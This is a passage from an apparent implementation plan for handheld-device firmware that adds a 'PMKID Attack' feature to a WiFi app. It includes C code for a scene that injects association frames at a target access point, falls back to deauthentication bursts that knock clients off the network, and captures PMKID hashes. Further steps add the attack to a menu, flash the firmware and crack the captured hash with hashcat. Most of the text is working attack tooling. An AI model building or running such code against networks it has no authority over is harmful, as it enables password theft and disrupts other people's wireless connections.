    m->ssid[sizeof(m->ssid) - 1] = 0;
    memcpy(m->bssid, s_bssid, 6);
    m->channel = s_channel;
    m->state = s_state;
    m->attempts = s_attempts;
    m->have_pmkid = s_have_pmkid;
    if(s_have_pmkid) {
        for(int i = 0; i < 16; i++) snprintf(m->pmkid_hex + i * 2, 3, "%02x", s_pmkid[i]);
    }
    view_commit_model(app->view_pmkid, true);
}

void wlan_app_scene_pmkid_on_enter(void* context) {
    WlanApp* app = context;
    s_w = 0;
    s_r = 0;
    s_attempts = 0;
    s_have_pmkid = false;
    memset(s_pmkid, 0, sizeof(s_pmkid));
    if(!s_pool) s_pool = malloc(sizeof(PmkPkt) * PMK_POOL_SIZE);

    const WlanApRecord* t = pmk_pick_target(app);
    if(t) {
        memcpy(s_bssid, t->bssid, 6);
        strncpy(s_ssid, t->ssid, sizeof(s_ssid) - 1);
        s_ssid[sizeof(s_ssid) - 1] = 0;
        s_channel = t->channel ? t->channel : 1;
    } else {
        memset(s_bssid, 0, 6);
        s_ssid[0] = 0;
        s_channel = 1;
    }

    if(!wlan_hal_is_started()) wlan_hal_start();
    if(wlan_hal_is_connected()) wlan_hal_disconnect();
    wlan_hal_get_own_mac(s_own_mac);
    wlan_hal_set_channel(s_channel);
    s_storage = furi_record_open(RECORD_STORAGE);

    wlan_hal_set_promiscuous(true, pmk_rx_cb);
    pmk_set_state(PmkidStateAssociating);
    if(t) pmk_inject_assoc();
    pmk_set_state(PmkidStateWaiting);
    pmk_publish(app);

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewPmkid);
}

bool wlan_app_scene_pmkid_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    if(event.type != SceneManagerEventTypeTick) return false;

    if(s_have_pmkid) {
        if(s_state != PmkidStateCaptured) {
            wlan_hal_set_promiscuous(false, NULL);
            pmk_set_state(PmkidStateCaptured);
        }
        pmk_publish(app);
        return false;
    }

    if(pmk_drain()) {
        wlan_hal_set_promiscuous(false, NULL);
        pmk_set_state(PmkidStateCaptured);
        pmk_publish(app);
        return false;
    }

    uint32_t elapsed = now_ms() - s_state_since_ms;
    if(s_state == PmkidStateWaiting) {
        if(elapsed >= PMK_FALLBACK_AFTER_MS) {
            pmk_set_state(PmkidStateFallback);
        } else if(elapsed >= PMK_ASSOC_RETRY_MS && s_attempts < PMK_MAX_ATTEMPTS) {
            pmk_inject_assoc();
            s_state_since_ms = now_ms();
        }
    } else if(s_state == PmkidStateFallback) {
        pmk_deauth_burst();
        s_state_since_ms = now_ms(); /* re-space bursts one tick apart */
    }
    pmk_publish(app);
    return false;
}

void wlan_app_scene_pmkid_on_exit(void* context) {
    UNUSED(context);
    wlan_hal_set_promiscuous(false, NULL);
    pmk_drain();
    if(s_storage) {
        furi_record_close(RECORD_STORAGE);
        s_storage = NULL;
    }
    if(s_pool) {
        free(s_pool);
        s_pool = NULL;
    }
    s_w = 0;
    s_r = 0;
    s_have_pmkid = false;
}
```

- [ ] **Step 3: Build to verify the scene compiles + links**

Run (Windows cmd):

```
build_ci.bat
```

Expected: `Project build complete`. (If the linker complains about `wlan_hal_get_own_mac`, confirm its exact name in `wlan_hal.h` — it is declared there as `bool wlan_hal_get_own_mac(uint8_t out[6]);`.)

- [ ] **Step 4: Commit**

```bash
git add applications/main/wlan_app/scenes/scene_pmkid.c applications/main/wlan_app/scenes/scene_config.h
git commit -m "feat(wlan): add PMKID attack scene (clientless assoc + deauth fallback)"
```

---

### Task 6: Menu integration — reach the scene from the attack menu

**Files:**
- Modify: `applications/main/wlan_app/scenes/scene_attack_targets.c` (the `AttackItemIndex` enum ~line 9, the `variable_item_list_add` block ~line 155-158, and the custom-event `switch` ~line 180-200)

**Interfaces:**
- Consumes: `WlanAppScenePmkid` (Task 5).
- Produces: a "PMKID Attack" row in the attack-targets list that routes to the PMKID scene using the same selected target as "Capture Handshake".

- [ ] **Step 1: Add the menu index**

In `applications/main/wlan_app/scenes/scene_attack_targets.c`, extend the `AttackItemIndex` enum. It currently ends at `AtIdxLiveCreds = 5`; the "MiTM" item sits at index 5 and Live-Creds routing reuses it. Add PMKID as the next index **after** the last added row (see Step 2 for ordering):

```c
enum AttackItemIndex {
    AtIdxPortScanner = 2,
    AtIdxPackageSniffer = 3,
    AtIdxHandshake = 4,
    AtIdxLiveCreds = 5,
    AtIdxPmkid = 6,
};
```

- [ ] **Step 2: Add the list row**

In the same file, in the block that adds rows (after `variable_item_list_add(list, "MiTM", 0, NULL, app);`), append:

```c
    variable_item_list_add(list, "PMKID Attack", 0, NULL, app);
```

This makes "PMKID Attack" the 7th row (indices: 0 Block, 1 Throttle, 2 Port Scanner, 3 Package Sniffer, 4 Capture Handshake, 5 MiTM, 6 PMKID Attack), matching `AtIdxPmkid = 6`.

- [ ] **Step 3: Route the event**

In the `SceneManagerEventTypeCustom` `switch(event.event)`, add a case (after the `AtIdxLiveCreds` case):

```c
        case AtIdxPmkid:
            app->channel_mode_active = false;
            scene_manager_next_scene(app->scene_manager, WlanAppScenePmkid);
            consumed = true;
            break;
```

- [ ] **Step 4: Full build**

Run (Windows cmd):

```
build_ci.bat
```

Expected: `Project build complete` and a fresh `Flipper-cardputer_adv-merged.bin`.

- [ ] **Step 5: Commit**

```bash
git add applications/main/wlan_app/scenes/scene_attack_targets.c
git commit -m "feat(wlan): add PMKID Attack entry to the attack menu"
```

---

### Task 7: On-hardware validation

**Files:** none (manual verification; record results in the commit message / a note).

**Interfaces:** Consumes the full firmware from Task 6.

- [ ] **Step 1: Flash the firmware**

Connect the Cardputer ADV over USB and flash the merged binary (adjust the port; the project's `flash_rs.bat` documents the working invocation):

```
esptool.py --chip esp32s3 -b 460800 write_flash 0x0 Flipper-cardputer_adv-merged.bin
```

Expected: `Hash of data verified.` then `Hard resetting`.

- [ ] **Step 2: Clientless path against a PMKID-capable AP**

Set up a WPA2 AP that supports PMKID caching (most home routers) with a known PSK, and **no client** associated to it. On the device: WiFi app → scan → select that AP as target → open the attack menu → **PMKID Attack**.

Expected: state advances Associating → Waiting; within a few seconds the view shows **PMKID CAPTURED!** with a 16-hex prefix. Confirm `/ext/wifi/pmkid.22000` gained a `WPA*01*...` line (pull via the WebUI/USB storage). Verify it cracks:

```
hashcat -m 22000 pmkid.22000 -a 0 <wordlist-containing-the-PSK>
```

Expected: the known PSK is recovered.

- [ ] **Step 3: Fallback path**

Target an AP that ignores injected assoc frames (or set the client scenario). Confirm that after ~9 s the state shows **Deauth fallback...** and, with a real client present that reconnects, a PMKID is still captured and saved.

- [ ] **Step 4: Lifecycle stress**

Enter and Back out of the PMKID scene ~10 times rapidly. Expected: no crash, no reboot, keyboard/other apps still work (promiscuous mode was released each exit; no leaked buffer/thread).

- [ ] **Step 5: Record the result**

```bash
git commit --allow-empty -m "test(wlan): PMKID clientless capture validated on Cardputer ADV hardware"
```

---

## Self-Review Notes

- **Spec §3 (Approach A+C):** Task 1 (frame builders) + Task 5 (inject + fallback state machine) cover manual association and the deauth backstop. ✓
- **Spec §4.2 (raw-TX cap lift):** Task 2. ✓
- **Spec §4.3 (shared writer refactor):** Task 3. ✓
- **Spec §4.1 (view) / §5 (state machine):** Task 4 + Task 5. ✓
- **Spec §4 (menu entry / scene registration):** Task 5 (scene_config.h) + Task 6 (menu). ✓
- **Spec §8 (host tests + hardware):** Task 1 (host) + Task 7 (hardware). ✓
- **Spec §7 (lifecycle):** enforced in Task 5 `on_exit` and the guarded RX callback. ✓
- **Type consistency:** `WlanPmkidViewModel`/`PmkidState` defined in Task 4 and consumed unchanged in Task 5; `wlan_pmkid_save` signature defined in Task 3 and called in both Task 3 (handshake) and Task 5 with matching args; frame-builder signatures identical between Task 1 header and Task 5 calls. ✓
- **Deferred (not in these tasks, per spec YAGNI):** multi-AP sweep, dedicated settings screen. ✓
